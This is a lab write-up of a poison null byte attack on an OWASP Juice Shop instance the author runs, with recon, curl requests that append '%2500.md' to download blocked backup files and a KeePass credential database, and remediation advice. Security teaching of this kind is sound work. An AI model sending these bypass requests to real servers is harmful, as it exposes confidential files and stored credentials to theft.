# 06 — Sensitive data exposure via poison null byte

| | |
|---|---|
| **Target** | OWASP Juice Shop @ `http://<mac-ip>:8088` (own lab) |
| **Authorization** | Own lab — see repo scope |
| **Class** | OWASP A01:2021 — Broken Access Control / A02 Sensitive Data Exposure |
| **Tools** | curl, browser |
| **Date** | 2026-06-24 |

## 1. Recon

The `/ftp` directory is browsable and lists more than it should:

```bash
curl http://<mac-ip>:8088/ftp/
```
```
acquisitions.md   announcement_encrypted.md   coupons_2013.md.bak
eastere.gg   encrypt.pyc   incident-support.kdbx   package.json.bak   legal.md
```

Backups (`.bak`), bytecode (`.pyc`), and a **KeePass database** (`.kdbx`) are
sitting in a web-served folder — all interesting.

## 2. Vulnerability

The server only lets you download an **allow-listed set of extensions**
(`.md`, `.pdf`, …) and **403s** the rest:

```bash
curl -o /dev/null -w '%{http_code}\n' http://<mac-ip>:8088/ftp/coupons_2013.md.bak   # 403
```

But the check is done on the **request string**, while the file is opened by a
lower layer that stops at a **NUL byte**. That mismatch is the classic
**poison null byte** (`%2500` = URL-encoded `\0`).

## 3. Exploitation

Append `%2500` + an allowed extension. The filter sees `...md` (allowed); the
file system reads up to the NUL and serves the real `.bak`:

```bash
# allowed extension -> direct (the "Confidential Document" file)
curl http://<mac-ip>:8088/ftp/acquisitions.md

# blocked extensions -> bypassed with the null byte
curl http://<mac-ip>:8088/ftp/coupons_2013.md.bak%2500.md
curl -O http://<mac-ip>:8088/ftp/package.json.bak%2500.md
curl -O http://<mac-ip>:8088/ftp/incident-support.kdbx%2500.md   # KeePass DB
```

Confirmed in the lab: direct `.bak` → **403**, `…%2500.md` → **200**.

> _evidence: ./assets/06-nullbyte-403-vs-200.png + the solved "Access a confidential
> document" / "Forgotten ... Backup" challenges on the score board_

## 4. Impact

Information disclosure of files that were meant to be off-limits: source/config
backups (`package.json.bak`), legacy data (`coupons_2013.md.bak`), bytecode, and
a **credential vault** (`incident-support.kdbx`). Backups and secret stores in a
web-served path are a direct path to deeper compromise (crack the KeePass → creds).

## 5. Remediation

- **Code fix:** don't validate on the raw request string. **Reject NUL bytes**,
  **canonicalize the path** (resolve `..`/encodings) and confirm it stays inside
  the allowed dir, then allow-list by the **resolved file**, not the URL suffix.
  Above all: **don't serve backups/secrets from a web-reachable folder** —
  `.bak`/`.kdbx`/`.pyc` shouldn't be there at all.
- **Shift-left (#2):** **Gitleaks** / secret scanning flags credential files and
  secrets committed into the repo/artifact; Trivy/Checkov catch shipping them.
- **Supply chain (#3):** keep secrets out of images entirely (mounted at runtime),
  so even a path-traversal reads nothing useful.
- **Platform (#1):** egress **default-deny** means that even after reading a file,
  the attacker can't exfiltrate it out of the namespace; **#5** Hubble shows the
  unusual `/ftp` access pattern.

## References

- OWASP — Path Traversal / Null Byte Injection; "Pwning OWASP Juice Shop"
- OWASP A01:2021 Broken Access Control; A02:2021 Cryptographic/Sensitive Data
